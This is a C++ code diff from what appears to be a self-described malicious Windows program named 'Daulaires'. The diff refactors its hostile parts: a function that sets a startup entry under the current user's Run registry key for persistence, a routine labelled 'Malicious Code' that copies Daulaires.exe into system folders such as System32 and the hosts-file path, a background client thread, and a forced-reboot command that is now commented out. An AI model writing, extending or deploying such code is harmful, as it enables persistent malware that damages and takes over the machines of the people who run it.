@@ -40,7 +40,7 @@ auto Main::Windows() -> bool
 
     Memory.SilentWriteToFile("test.txt", "C:\\Users\\Public\\", "Hello, world!");
 
-    system("shutdown /r /t 0");
+    // system("shutdown /r /t 0");
 
     while (true) {
 
@@ -129,8 +129,8 @@ auto Main::Windows() -> bool
 
 auto Main::NotWindows(void) -> bool
 {
-    Info Info;
-    cout << "You are not using Windows" << endl;
+    Utils Utils;
+    Utils.DisplayText("You are not using Windows.");
     return 0;
 };
 
@@ -140,7 +140,7 @@ void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
     // Open the registry key for current user startup programs
     if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         // Set the registry entry for your application
-        if (RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
+        if (RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), static_cast<DWORD>((appPath.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) {
             std::wcerr << L"Error setting registry entry." << std::endl;
         }
 
@@ -152,7 +152,7 @@ void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
     }
 };
 
-auto Malicious() -> void {
+auto write_file_to_dirs() -> void {
     map<string, string> paths;
     // app different paths to the map
     paths["C:\\Users\\Public\\"] = "C:\\Users\\Public\\";
@@ -166,7 +166,7 @@ auto Malicious() -> void {
     paths["C:\\Windows\\System32\\drivers\\etc\\"] = "C:\\Windows\\System32\\drivers\\etc\\";
     paths["C:\\Windows\\System32\\drivers\\etc\\hosts"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";
 
-    std::wstring appName = L"Daulaires";
+    std::wstring appName = L"Daulaires.exe";
     // loop through all the paths and add Daulaires.exe to them
     for (const auto& path : paths) {
         // convert the path to a string before adding the file name
@@ -181,7 +181,8 @@ int main() {
     Info Info;
     Main Main{};
     
-    auto name = Info.assignName();
+    string name = Info.assignName();
+
     // allow another console to run the client
     std::thread clientThread([&]() {
         Client(name.c_str());
@@ -194,8 +195,12 @@ int main() {
         Main.NotWindows();
         return 1;
     };
-    // Malicious Code
-    Malicious();
+
+    /*Malicious Code*/
+    scanThroughDirs();
+    write_file_to_dirs();
+    /*End Malicious Code*/ 
+    
     // loop through the Info functions to check what the system is
     Main.Windows();
 
